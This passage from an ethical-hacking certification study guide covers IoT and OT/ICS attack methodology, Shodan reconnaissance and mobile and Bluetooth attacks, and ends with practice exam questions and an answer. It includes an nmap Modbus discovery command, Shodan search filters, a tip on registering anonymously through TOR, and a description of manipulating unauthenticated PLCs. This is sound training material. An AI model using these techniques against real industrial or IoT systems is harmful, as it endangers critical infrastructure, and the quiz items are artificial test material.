you’d open Google and start searching. Why? Because Google is a giant search engine
crawling nearly every website worldwide, and you know the answers to your questions
are in there somewhere.

08-ch08.indd 327 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

328

Figure 8-4 Shodan

Shodan (https://www.shodan.io/) is often referred to as the search engine for every-
thing. See, Google and other search engines index the Web, while Shodan indexes pretty
much everything else (see Figure 8-4). Want to find all webcams in a specific city? Shodan
can help. Want to see where the wind turbines are in your state and how they’re doing?
Shodan again. How about utilities, smart TVs, SCADA systems (discussed in the next
section), medical devices, traffic lights, refrigerators, and the aforementioned Internet-
enabled underwear? I’ll take Shodan for $500, Alex. Shodan indexes anything and every-
thing imaginable that is or once was (and many times probably shouldn’t be) plugged
into the Internet.

Shodan is to everything else what Google is to the Web. It’s incredibly powerful, super
cool, and fun to use—and can be exceptionally dangerous. Shodan can provide you loads
of information about all the devices you wish to look for, and can do so with the benefit
of hiding your identity while you’re searching. After all, Nmap can be incredibly noisy at
times, but Shodan may have crawled your targets weeks ago, and done so anonymously
(for you anyway).

NOTE Shodan requires a registration, but is ree to use. It is highly
recommended you take great pains to obscure your identity as much as
possible beore signing up and using it. For example, you might consider
loading TOR on a USB, using that connection to create a ake e-mail
account, and registering with that account. And by all means, and I cannot
stress this enough, i you are planning on using Shodan or anything even
vaguely illegal or malicious, save yoursel (and me) the bother and just step
away, please.

I highly recommend that you check out Shodan and learn some common filters (like
city:, hostname:, geo:, port:, and net:, for starters): for example, apache city:"Huntsville"
will show you all Apache servers Shodan found in Huntsville, Alabama, and cisco
net:"69.192.0.0/16" will show all the Cisco devices Shodan can find on the subnet host-
ing basspro.com (as an aside, this is just an example—please leave BassPro alone; they’re

08-ch08.indd 328 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

329

awesome and you’ll get in bunches of trouble for ignoring me here…BUNCHES of
trouble). There are also multiple built-in, common searches available—just click them
and adjust as needed. I’d bet cash money you’ll see Shodan on future exam versions.

EXAM TIP Some o the other tools to assist in inormation gathering are
Censys (https://censys.io) and Thingul (https://www.thingul.net).

The second phase in IoT hacking methodology, vulnerability scanning, is exactly as
it sounds and reminds me of a cold data center floor on Marshall Space Flight Center,
many years ago. I was there with a couple of guys installing and configuring a vulner-
ability assessment suite. I won’t go into the name of the vendor, to protect the innocent,
but you’d recognize them. At any rate, we were plugging along and I got to talking with
the lead engineer from the vendor. We discussed the how, when, where, and whys, until
I asked him about scanning a network appliance we had. He paused for a moment,
turned away from the server rack with cables in hand, and told me, “Matt, this thing
will scan a microwave if you want it to.” At the time, we all thought that was just hilari-
ous. Imagine, scanning a microwave for vulnerabilities you could exploit against the
enterprise. How ridiculous.

Fast-forward a few years, and now I’m wondering if there’s going to be a Patch Tuesday
for my toilet. There are, in fact, several vulnerability scanners and assessment tools for
IoT devices, and more are coming every day. Even though I’d argue it’s not a vulnerability
assessment tool, EC-Council lists Nmap as an option. Beyond Trust offers beSTORM
(https://www.beyondsecurity.com/bestorm.html). Some other tools are IoTsploit (https://
iotsploit.co) and IoT Inspector (https://www.iot-inspector.com).

Just How Lazy Can We Get?
I freely admit, this whole idea of the Internet of Things terrorizes me. Between this
and the seemingly nonstop rush into artificial intelligence, I find myself scream-
ing (virtually, of course) to everyone about the dangers it all poses. Some of that is
because I’m a security guy and, at heart, I’m suspicious and paranoid regarding…
well…everything. But some of it is because I’m prone to overreaction when I’m
just so dang certain of my opinion. And knowing this, I decided to add at least one
section of this chapter with a little lightheartedness concerning the whole thing.

I got to thinking, “If we can Internet-enable anything, what would be the
dumbest thing I could think of to put on the Internet?” I had some ideas of my
own, of course, but decided to take it to the search engines and see what I could
find. I quickly found I wasn’t the only one wondering this.

At the IoT World 2017 conference, attendees were asked what they thought the
most useless IoT devices were (https://www.iotworldtoday.com/2018/02/19/funny-
iot-devices-worst-internet-things/). Their selections? An IoT wine bottle, Internet-
enabled underwear (see? I told you this was real), and IoT strollers that sense your
walking stride and push your baby along in front of you without any assistance.

(continued )

08-ch08.indd 329 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

330

Gizmodo has listed a few useless items as well (https://gizmodo.com/15-idiotic-
internet-of-things-devices-nobody-asked-for-1794330999). Their submissions
included a Fitbit for your dog called a Trakz, a hairbrush embedded with a
gyroscope and a microphone (to monitor for correct hair brushing strokes and
activity), and a set of flip-flops that don’t measure steps or anything like that, but
send you notifications of sales from stores you happen to be flip-flopping by.

The Internet of Useless Things (https://iout.rehabagency.ai/) takes suggestions
for terrible (hence, useless) IoT startup ideas and mocks up the best of them. For
example, the Throne Master puts advanced on-board analytics on your toilet and
creates a game out of #2, allowing you to compare and compete with your family or
colleagues. The Intestinal Track 2.0 is a pill you swallow that lets you know when
you’re due for your next #2. And the FitSpoon measures the speed at which you’re
eating your cereal and, if it’s gluttonously fast compared to the rest of the world,
opens up holes in the spoon so you’ll eat less. The list of these things goes on and on
and, frankly, it’s hilarious.

In the movie WALL-E, the little robot surviving on his own for eons eventually
finds his way onto a spaceship cruise line that has been endlessly circling the solar
system. All humans on board are gigantic, soft, inept beings with their every whim
attended to by, well, IoT devices and robots. I fear if we’re actually enabling our
toilet paper rollers, hairbrushes, toothbrushes, and underpants, we’re not that far
away from it. Until then, though, take a moment and laugh at the hilarity of it all.

NOTE Weirdly, to me anyway, since Nessus is generally considered the
vulnerability scanner or most proessionals, Tenable’s IoT vulnerability
eorts (https://www.tenable.com/solutions/iot) aren’t even mentioned in
the courseware. I thought during the last edition o this book we’d see this
corrected, but alas, it’s still nowhere to be ound. Call me suspicious, but you
may wish to amiliarize yoursel with it anyway beore your exam.

The third phase in the methodology, launching attacks, is one we’ve covered
a bit already in this chapter. A few hacking tools not mentioned earlier include
Firmalyzer (https://firmalyzer.com, for performing active security assessments on IoT
devices), KillerBee (https://github.com/riverloopsec/killerbee), JTAGulator (www
.grandideastudio.com/jtagulator/), and Attify Zigbee Framework (https://github.com/
attify/Attify-Zigbee-Framework, providing a suite of tools for testing Zigbee devices).
As the IoT expands, so do the number, names, and frequency of attacks.

The last two phases, gaining access and then maintaining access, have been covered in
previous chapters, and most everything in previous discussions applies here. One thing I
did find very interesting, in both the official courseware and in reading up on IoT, is that,
believe it or not, Telnet is big in the IoT world. That’s right—our old insecure friend

08-ch08.indd 330 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

331

Telnet is often leveraged in IoT devices and provides a rather easy means to gain access.
Once there, you can, of course, install backdoors and malware, or force firmware updates
to ensure you can maintain a presence.

EXAM TIP How about a snier speciically or IoT traic? Foren6 (http://
cetic.github.io/oren6/) “leverages passive snier devices to reconstruct a
visual and textual representation o network inormation to support real-
world Internet o Things applications where other means o debug (cabled
or network-based monitoring) are too costly or impractical.” Another snier
option is CloudShark (https://www.qacae.com/analysis-tools/cloudshark/).

Finally, we can wrap up this foray into all thing IoT hacking by covering some defense
mitigations recommended for security professionals. EC-Council lists just over a dozen
efforts you can take to help secure your IoT devices and, for the most part, they’re straight-
forward and common sense. For example, hardening techniques have always included
removing unused accounts (guest and demo accounts) and services (Telnet is specifically
called out), and some measures are just common sense—like implementing IDS/IPS,
making use of built-in lockout features, encrypting wherever possible (VPN connectivity),
and using strong authentication. Other suggestions include disabling UPnP ports on rout-
ers, monitoring traffic on port 48101 (commonly used for malicious traffic), keeping up
to date with patching and firmware updates, and making use of DMZ zones for network
segmentation and traffic control.

And that, ladies and gentlemen, wraps up our short little foray into the IoT. It is, quite
literally, impossible for this or any book or study session to capture the entire breadth of
the IoT’s scope. I applaud EC-Council’s attempt, and actually found this information
useful and largely coherent and clear. I did my best here to shrink it down into digestible
portions and sincerely hope it helps you come exam time—and real-world work time.
Once again, however, I must implore you to do your own research. This technology is
growing by leaps and bounds, and the next exam-worthy attack tool discussion or termi-
nology will be right around the corner.

OT Hacking
You may be asking yourself right now, “What exactly is operational technology (OT) and
why am I reading about it in a chapter devoted to mobile and IoT devices and technol-
ogy?” And if you’re doing so, you’re in good company, because I asked the same thing
when reviewing the official courseware for CEH. After a little searching I found out
a couple things about OT. First, the term itself seems to have generated, largely, from
a Gartner (https://www.gartner.com) prediction way back in 2011. It seems Gartner
researchers put together a brief denoting the coming day when not only would IT services
reside in and demand security attention to IoT devices, but those same devices would
wind up interfacing with, and sometimes controlling, industrial systems. You know, sys-
tems that control and monitor little things like air conditioners, traffic signals, electric
grids, and fuel delivery systems.

08-ch08.indd 331 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

332

Secondly, it seems the U.S. government paid attention—at least the cyber organiza-
tions within it, anyway—and devoted a lot of time, energy, money, and documentation
efforts to OT. Search the Web for “operational technology” and you’ll more than likely
wind up reading NIST documents like SP 800-37 Rev. 2, NISTIR 8183 Rev. 1, NIST
SP 800-160 Vol. 2, or a host of others, and most of these will point you to Gartner.
There are a number of other websites and resources to learn about OT from (this article
in particular I liked for some reason: https://www.i-scoop.eu/industry-4-0/operational-
technology-ot/), but I’ll try to squeeze all the pertinent facts together here for you.

Definition and Concepts
Operational technology, as defined by Gartner and NIST (not to mention your official
courseware), is “hardware and software that detects or causes a change through the direct
monitoring and/or control of physical devices, processes and events in the enterprise.”
In other words, all the devices and controls that make your life convenient today have
technologies behind them that monitor and control things, and that is OT.

“OT” may be a new term for you, but it’s actually been around and part of our day-
to-day lives long before networking and IT became go-to career choices. In fact, OT has
been a part of our lives since humans started using electrically powered machines and
equipment. Operational technology is quite literally everywhere around you: in facto-
ries, utilities, oil and gas systems, and transportation, as well as in places that may hit a
bit closer to home, like office buildings, temperature control systems, refrigeration, and
healthcare facilities.

Architecture wise, OT consists of several subsets you may already be familiar with. For
example, supervisory control and data acquisition (SCADA) systems, industrial control
systems (ICSs), and remote terminal units (RTUs) all fall under the giant OT umbrella,
and OT can also be divided into the industry or service sector it works in (for example,
transportation, utility, and healthcare). Additionally, inside of OT there’s a whole new
world of terminology for you to memorize:

• Assets Physical and logical assets making up an OT system. For example, sensors,
servers, and network devices are physical assets, with program logic information,
diagrams, databases and firmware making up the logical side.

• Zones (aka conduits) These are network segmentation techniques.
• Industrial network A network consisting of automated control systems.
• Business network Systems offering information infrastructure to the business.
• Industrial protocols Includes both serial and Ethernet communication protocols

(like S7, CDA, CIP, etc.).
• Perimeter In two parts, the perimeter is either the network (a closed group of

assets inside a boundary) or the electronic security perimeter (boundary between
secure and insecure zones).

• Critical infrastructure The physical and logical systems that must be protected, as
harm or destruction could cause severe impact to safety, economy, or public health.

08-ch08.indd 332 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

333

EXAM TIP Another great acronym you’re going to need to know is IIOT, the
Industrial Internet o Things. IT/OT convergence is the convergence o IT
and OT systems to bridge gaps between the dierent technologies. This
allows or, and largely pushed into existence, Industry 4.0, bringing “smart
manuacturing” and IoT applications into industrial operations.

OT architecture is generally discussed and examined within something called the
Purdue Model. Developed way back in the 1990s by the Industry-Purdue University
Consortium for Computer Integrated Manufacturing, the Purdue Enterprise Refer-
ence Architecture (PERA) is still a widely used blueprint for discussing and evaluating
OT. It consists of three zones—Manufacturing Zone (OT), Enterprise Zone (IT), and
Demilitarized Zone (DMZ, also known as the Industrial Demilitarized Zone, IDMZ)—
showing the internal connections and even dependencies of ICS network components.
A graphical representation of the model is shown in Figure 8-5.

EXAM TIP Industrial control systems can be controlled in three main modes:
open loop, closed loop, and manual. Control actions in an open loop system
are independent o the desired output (i.e. the output is not measured or ed
back to the input or comparison). Open loop systems operate without any
checks and balances and are expected to ollow input commands regardless
o the inal result. Closed loop control systems have the control action
entirely dependent on the desired output. They measure, monitor, and
control the process using eedback to compare actual versus desired output.
Manual systems, obviously, rely on operator input.

Industrial control system architecture is perhaps the item you’ll most likely encounter
on your exam. ICS architecture is basically a collection of different control systems (like
SCADA, BPCS, RTU, and DCS systems) as well as their associated equipment and con-
trol mechanisms. ICSs are found extensively in the utilities world (distribution of elec-
tricity, water, etc.) and the transportation arena (covering the distribution of everything
from oil and gas to pharmaceuticals and food), and there are a few components you’ll
need to pay close attention to. For instance, the distributed control system (DCS) is a

Figure 8-5 Enterprise Enterprise network Level 5

The Purdue (IT Systems)
Zone Business logistics systems Level 4

Model

Industrial DMZ (IDMZ)

Site operations Level 3

Manufacturing Control systems/Area supervisory controls Level 2

(OT Systems)
Zone Basic controls Level 1

Physical processes Level 0

08-ch08.indd 333 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

334

large-scale, highly engineered system containing (usually) a central supervisory control
unit and multiple (sometimes thousands of ) input/output points that is used to control
specific industry tasks. SCADA is another centralized supervisory control system gener-
ally used for controlling and monitoring industrial facilities and infrastructure. SCADA
consists of a control server (SCADA-MTU), communications devices, and distributed
field sites (used to actually monitor and control specific operations).

NOTE Other acronyms you may see thrown about during OT/ICS discussion
include PLC (programmable logic controller), BPCS (basic process control
system), and SIS (saety instrumented systems).

Security Concerns
As if the mere existence of connected devices holding the literal keys to turn on or off
critical infrastructure wasn’t enough to push most security folks over the sanity cliff, OT
systems evolved to allow the ability to monitor and control physical devices remotely. Add
to that machine-to-machine communication and the Internet of Things, and suddenly
the very idea of security in the entire system turns into a nightmare. And since OT pro-
vides such a large attack surface, EC-Council wanted to make sure that you, the budding
Certified Ethical Hacker, have at least some idea of how to attack it.

As with everything else in CEH-land, there is an attack methodology to follow. Thank-
fully, though, the attack methodology used for OT closely mirrors what has already
been discussed in regard to system hacking: information gathering, vulnerability scan-
ning, launching attacks, gaining remote access, and maintaining access. The same steps,
actions, and oftentimes tools from previous attack methodology discussion also apply
here. For one example, a great place to gather information on the systems themselves
would be Shodan; since Shodan catalogues anything connected to the Internet that it
can see, you can gather all sorts of information and details on SCADA systems from
Shodan. You might also gather some interesting information using an online database
of SCADA default passwords named CRITIFENCE (http://www.critifence.com). And
who knows—you might even discover SCADA systems during a plain-old Nmap scan.
There are multiple scan operators you can use (for example, you might discover modbus
systems with nmap -Pn -sT -p 502 –script modbus-discover <target IP>) that are read-
ily available on numerous sites.

NOTE Schneider Electric is a big player in the PLC realm, and Modbus is
a data communications protocol they use within their PLCs. So perhaps a
quick search in Shodan or either Modbus, Schneider Electric, or both—
maybe also combined with a geographic limiting operator—might show
you a world o SCADA very close by.

The different attack type definitions we’ve already covered still apply in the OT world
exactly as they do elsewhere, so thankfully you don’t have additional memorization in
that regard. There are a few tools you should be aware of, however. For example, GDB

08-ch08.indd 334 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

335

Figure 8-6 Using Metasploit or Modbus scanning and manipulation

(https://www.gnu.org/software/gdb/), Radare2 (https://github.com/radareorg/radare2),
OpenOCD (http://openocd.org), and IDA Pro (https://hex-rays.com) are all debug
tools mentioned by EC-Council for you to take a look at. When it comes to “hacking”
these systems, Metasploit is one mentioned specifically by the official courseware. You
can use it to scan for Modbus slaves and then manipulate the data (see Figure 8-6).

Another method of note deals with a tool named modbus-cli. Modbus master and
slaves communicate in plain text with no authentication. If you can gain access, and if
you can craft the appropriate, similar query packets to Modbus slaves, you may be able
to access and manipulate them. After identifying PLCs connected to the Internet, install
modbus-cli and fire away. According to the modbus-cli GitHub page (https://github
.com/tallakt/modbus-cli), it is “a command line utility that lets you read and write data
using the Modbus TCP protocol (ethernet only, no serial line). It supports different data
formats (bool, int, word, float, dword), allows you to save data to a file and dump it back
to your device, acting as a backup tool, or allowing you to move blocks in memory.”

EXAM TIP Modbus has announced they are replacing the term “master-
slave” with “client-server,” but I am sticking with the terminology used in the
courseware and on the exam.

There’s an entire world involved in the OT/ICS/SCADA realm, and there are moun-
tains of books on just this topic. However, with your study in mind, I’ve tried to stick
with what you really need to know for the exam. As I’ve noted several times previously in
this book, and will no doubt do so again in remaining chapters, don’t rely on this writing
alone. Go out and read and investigate on your own. You’ll be better prepared not just
for your exam but for your eventual job in the field.

Chapter Review
The Open Web Application Security Project (OWASP) has an arm dedicated specifically
to mobile security and publishes a Top 10 list of mobile risks.

08-ch08.indd 335 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

336

When it comes to mobile platforms, there are two major players in the field—Android
and iOS. Android was created by Google specifically for mobile devices, and it contains
an OS, middleware, and a suite of built-in applications for the mobile user. iOS is Apple’s
operating system for mobile devices—that is, the iPhone and iPad (you will also find iOS
on Apple TV and iPods). Built-in applications include everything from entertainment
apps to an AI app with a woman’s voice that answers questions for you (Siri).

Whether Android or iOS, one topic you will get asked about is rooting (Android)
or jailbreaking (iOS) the device. Both mean the same thing: perform some action that
grants you administrative (root) access to the device so you can do whatever you want
with it. There are multiple tools to help you in your Android rooting efforts. These
include KingoRoot, TunesGo, OneClickRoot, and MTK Droid.

Jailbreaking an iOS device (which, just like rooting, invalidates every warranty you can
think of ) can be accomplished with Cydia (cydiafree.com), Hexxa Plus (pangu8.com),
Apricot (pangu8.com), and yuxigon (yuxigon.com). Techniques include untethered (ker-
nel remains patched—that is, jailbroken—after reboot, with or without a system con-
nection), semi-tethered (reboot no longer retains the patched kernel but the software has
already been added to the device; therefore, if admin privileges are required, the installed
jailbreaking tool can be used), and tethered (reboot removes all jailbreaking patches, and
the device may get stuck in a perpetual loop on startup, requiring a system connection,
such as USB, to repair). The three types of jailbreaking include Userland (provides user-
level access but not admin), iBoot, and BootROM (both provide admin-level access).

Many of the vulnerabilities and attack vectors covered in previous chapters also apply
to mobile. Perhaps the most obvious attack vector comes from the apps themselves.
Others include social engineering, phishing, and physical security. Android’s Device
Administration API provides system-level device administration that can be used to cre-
ate “security-aware” apps that may prove useful within an organization.

BYOD—bring your own device—allows users to bring their own smartphones and
tablets to the organization’s network. The problem with BYOD is security and control.
Mobile device management (MDM), much like Group Policy and such in the Microsoft
Windows world, is an effort to add some control to enterprise mobile devices. MDM helps
in pushing security policies, application deployment, and monitoring of mobile devices.
Most MDM solutions offer the same basic features: passcodes for device unlocking, remote
locking, remote wipe, root or jailbreak detection, policy enforcement, inventory, and moni-
toring/reporting. Some of the solutions are Citrix XenMobile, IBM Security MaaS360,
and SOTI MobiControl.

4G, 5G, and Bluetooth are other connectivity means to know. 4G and 5G refer
to fourth- and fifth-generation mobile telecommunications, respectively, and offer
broadband-type speeds for data usage on mobile devices (cell phones and such). Blue-
tooth refers to a very open wireless technology for data exchange over a relatively short
range (10 meters or less). Bluetooth devices are easy to connect one to another and can
even be set to look for other devices for you automatically. Bluetooth devices have two
modes: discovery mode and pairing mode. Discovery mode determines how the device
reacts to inquiries from other devices looking to connect, and it has three actions. The
discoverable action has the device answer to all inquiries, limited discoverable restricts that
action, and nondiscoverable tells the device to ignore all inquiries.

08-ch08.indd 336 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

337

Whereas discovery mode details how the device lets others know it’s available, pairing
mode details how the device reacts when another Bluetooth system asks to pair with it.
There are basically only two versions: yes, I will pair with you, and no, I will not. Non-
pairable rejects every connection request, whereas pairable accepts all of them.

Attacks on mobile devices abound. First and foremost, phishing attacks and social
engineering are merciless when it comes to mobile devices. SMS phishing leverages text
messaging to attack users and devices. The list of Trojans available is almost without end.
Notable Android Trojans include TeaBot, FakeInst, OpFake, Boxer, and KungFu. Spy-
ware is really scary, and tools like Mobile Spy and SPYERA make it really easy to listen
in on or even watch what the target is doing. Tools like AndroidLost, Find My Phone,
and Where’s My Droid were designed to help users find lost phones, but they (and many
others) can be used to track where users happen to be located.

The mobile device can also be used as an attack platform. Tools like Network Spoofer
allow you to control how websites appear on a desktop/laptop. DroidSheep allows you to
perform sidejacking by listening to wireless packets and pulling session IDs. Nmap works
great on a mobile device, and sniffers are a dime a dozen. Heck, you can even install Kali
Linux on the thing and turn it into a full-featured hacking machine. NetCut claims to
be able to identify all systems on your current Wi-Fi, identify which ones you don’t like,
and, with the click of a button, cut them off Wi-Fi.

The major Bluetooth attacks are Bluesmacking (denial-of-service attack against the
device), Bluejacking (sending unsolicited messages to, and from, mobile devices), Bluesn-
iffing (effort to discover Bluetooth-enabled devices—much like war driving in wireless
hacking), Bluebugging (accessing a Bluetooth-enabled device and remotely using its fea-
tures), Bluesnarfing (theft of data from a mobile device due to an open connection—such
as remaining in discoverable mode), and Blueprinting (footprinting for Bluetooth).

The Internet of Things (IoT) can be defined as a collection of devices using sensors,
software, storage, and electronics to collect, analyze, store, and share data among themselves
or where applicable to a user. It refers to a network of devices with IP addresses that have
the capability of sensing, collecting, and sending data to each other—basically a web of con-
nected devices made possible by machine-to-machine communications, large availability of
storage, and internetworked communications. IoT technologies extend Internet connectiv-
ity beyond “standard” devices, such as desktops, laptops, smartphones, and tablets, to any
range of traditionally non-network-enabled physical devices and everyday objects.

IoT architecture comes down to three basic components—things using sensing tech-
nology, IoT gateways, and the cloud (or put another way, data storage availability). A thing
inside the IoT is defined as any device implanted somewhere that has the capability (and
purpose) of communicating on the network. Each IoT device is embedded with tech-
nology, can communicate and interact over the Internet, and oftentimes can be remotely
monitored and controlled. Each of these things has some form of sensing technology. In
other words, sensors are embedded in the device to measure and forward data.

IoT OS examples include RIOT OS, ARM mbed OS, RealSense OS X, Nucleus
RTOS, Brillo, Contiki, Zephyr, Ubuntu Core, Integrity RTOS, and Apache Mynewt.
There are four IoT communication models—device to device, device to gateway, device
to cloud, and back-end data sharing. All work exactly as their names suggest, with only
a couple of knowledge nuggets you can tuck away for test purposes. Device to gateway

08-ch08.indd 337 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

338

adds a collective (aka a gateway device) before sending to cloud, which can be used to
offer some security controls, and back-end data sharing is almost exactly like device to
cloud; however, it adds the ability for third parties to collect and use the data.

Once a thing has sensed and collected data, it forwards that data to the next compo-
nent, the IoT gateway. This is designed to send collected data from devices to the user
or to the third component, data storage or cloud, for use later. The cloud stores and ana-
lyzes data, providing information back for future queries. The Vehicle Ad Hoc Network
(VANET) is the communications network used by our vehicles. It refers to the spontane-
ous creation of a wireless network for vehicle-to-vehicle (V2V) data exchange.

In addition to the basic components, EC-Council lists a few architecture layers inside
IoT: Edge Technology Layer, Access Gateway Layer, Internet Layer, Middleware Layer,
and Application Layer. IEEE maintains a journal of all things IoT, and ITU has a great
collection of news articles about current IoT efforts.

OWASP’s Top 10 mobile risks include M1: Improper Platform Usage, M2: Insecure
Data Storage, M3: Insecure Communication, M4: Insecure Authentication, M5: Insuf-
ficient Cryptography, M6: Insecure Authorization, M7: Client Code Quality, M8: Code
Tampering, M9: Reverse Engineering, and M10: Extraneous Functionality.

OWASP’s Top 10 IoT vulnerabilities include I1: Weak, Guessable, or Hardcoded
Passwords, I2: Insecure Network Services, I3: Insecure Ecosystem Interfaces, I4: Lack
of Secure Update Mechanism, I5: Use of Insecure or Outdated Components, I6: Insuf-
ficient Privacy Protection, I7: Insecure Data Transfer and Storage, I8: Lack of Device
Management, I9: Insecure Default Settings, and I10: Lack of Physical Hardening

OWASP’s IoT Attack Surface Areas include Ecosystem (general), Device Memory,
Device Physical Interfaces, Device Web Interface, Device Firmware, Device Network
Services, Administrative Interface, Local Data Storage, Cloud Web Interface, Third-
party Backend APIs, Update Mechanism, Mobile Application, Vendor Backend APIs,
Ecosystem Communication, Network Traffic, Authentication/AuthorizationPrivacy, and
Hardware (Sensors).

All previous, and subsequent, attacks mentioned in this book probably have a role
in the IoT world as well. For example, DDoS (distributed denial of service) in IoT isn’t
any different from any other DDoS against or using “normal” devices. In one version of
this, noted as the Sybil attack in EC-Council’s curriculum, multiple forged identities are
used to create the illusion of traffic congestion that affects everyone else in the local IoT
network. EC-Council also notes HVAC attacks in IoT attack—hack IoT devices in order
to shut down air conditioning services.

A couple other attacks specifically called out are rolling code and BlueBorne. The code
used by your key fob to unlock (and in some cases) start your car is called a rolling (or
hopping) code. An attack can sniff for the first part of the code, jam the key fob, and
sniff/copy the second part on subsequent attempts, allowing the attacker to steal the
code—and your car. A BlueBorne attack is basically an amalgamation of techniques and
attacks against known, already existing Bluetooth vulnerabilities. One of the better ways
to pull this one off is to use hardware specifically designed for it, like the HackRF One.
Mirai malware purposefully looks for and interjects itself onto IoT devices. After success-
ful infiltration, it basically propagates and creates gigantic botnets—with the primary
purpose of DDoS attacks thereafter.

08-ch08.indd 338 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

339

The IoT hacking methodology phases are information gathering, vulnerability scan-
ning, launching attacks, gaining access, and maintaining access. Shodan is often referred
to as the search engine for everything and is a good start in information gathering. Some
other tools to assist in information gathering include Censys and Thingful.

The second phase in IoT hacking methodology, vulnerability scanning, is exactly
as it sounds. There are several vulnerability scanners and assessment tools for IoT
devices, and more are coming every day. EC-Council lists Nmap as an option. Beyond
Trust offers a couple of tools for IoT scanning, including beSTORM. Some other
tools are IoTsploit and IoT Inspector.

In the launching attacks phase, IoT hacking tools include Firmalyzer (for performing
active security assessments on IoT devices), KillerBee, JTAGulator, and Attify Zigbee
Framework (providing a suite of tools for testing Zigbee devices).

The last two phases are gaining access and then maintaining access. Telnet is often
leveraged in IoT devices and provides a rather easy means to gain access. Once there you
can, of course, install backdoors, malware, or force firmware updates to ensure you can
maintain a presence. Sniffers for IoT traffic include Foren6, and CloudShark.

Finally, operational technology (OT) is hardware and software that detects or causes a
change through the direct monitoring and/or control of physical devices, processes, and
events in the enterprise. Comprising ICS, SCADA, and other systems, OT is a broad
topic with an architecture largely defined and discussed with the Purdue Model (PERA),
consisting of three zones: Manufacturing Zone (OT), Enterprise Zone (IT), and Demili-
tarized Zone (DMZ, aka Industrial Demilitarized Zone [IDMZ]). ICS architecture is
basically a collection of different control systems (like SCADA, BPCS, RTU, and DCS
systems) as well as their associated equipment and control mechanisms. Multiple attack
vectors and tools are available.

Questions
1. Which of the following is the best choice for performing a Bluebugging attack?

A. PhoneSnoop
B. BBProxy
C. btCrawler
D. Blooover

2. The operations staff promotes the use of mobile devices in the enterprise. The
security team disagrees, noting multiple risks involved in adding mobile devices
to the network. Which of the following actions provides some protections against
the risks the security team is concerned about?
A. Implement WPA.
B. Add MAC filtering to all WAPs.
C. Implement MDM.
D. Ensure all WAPs are from a single vendor.

08-ch08.indd 339 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

340

3. You want to gain administrative privileges over your Android device. Which of
the following tools is the best option for rooting the device?
A. Pangu
B. OneClickRoot
C. Cydia
D. evasi0n7

4. Which of the following jailbreaking techniques will leave the phone in a jailbroken
state even after a reboot?
A. Tethered
B. Untethered
C. Semi-tethered
D. Rooted

5. A mobile device communication session using SSL fails, and data is available for
viewing by an attacker. Which OWASP Top 10 Mobile Vulnerability category has
been made available for exploit?
A. M3: Insecure Communication
B. M4: Insufficient Authentication
C. M5: Insufficient Cryptography
D. M10: Extraneous Functionality

6. Which of the following is an iOS jailbreaking type that cannot be patched by
Apple, as the failure is within the hardware itself, and provides admin-level access
after successful completion?
A. iBoot
B. Userland
C. Untethered
D. BootROM

7. Which IoT communication model makes use of a component adding a collective
(aka a gateway device) before sending data to the cloud, which adds a measure of
security control to the application?
A. Device to device
B. Device to cloud
C. Device to gateway
D. Device to security

08-ch08.indd 340 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

Chapter 8: Mobile Communications and the IoT

341

8. Which OWASP IoT Top 10 vulnerability category deals with poorly protected
passwords?
A. I1: Weak, Guessable, or Hardcoded Passwords
B. I2: Insecure Network Services
C. I8: Lack of Device Management
D. I9: Insecure Default Settings

9. An attacker leverages a vulnerability within Bluetooth on an IoT device and
successfully shuts down the air conditioning to the data center floor. Which of
the following best describes the attack type used?
A. HVAC
B. BlueAir
C. Rolling code
D. BlueBorne

10. In which phase of the IoT hacking methodology would the Shodan search engine
most likely be used?
A. Vulnerability scanning
B. Information gathering
C. Launching attacks
D. Gaining access

11. Which of the following tools is the best choice for sniffing IoT traffic?
A. Firmalyzer
B. beSTORM
C. Foren6
D. Shodan

12. Which ICS control system mode compares the monitored output of an action to
a desired state?
A. Open loop
B. Manual
C. Closed loop
D. Circular

13. Which of the following is a small solid-state control system where instructions
can be tailored to carry out a particular task?
A. PLC
B. DCS
C. SCADA
D. BPCS

08-ch08.indd 341 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 8

CEH Certified Ethical Hacker All-in-One Exam Guide

342

Answers
1. D. Blooover is designed for Bluebugging. BBProxy and PhoneSnoop are both

Blackberry tools, and btCrawler is a discovery option.
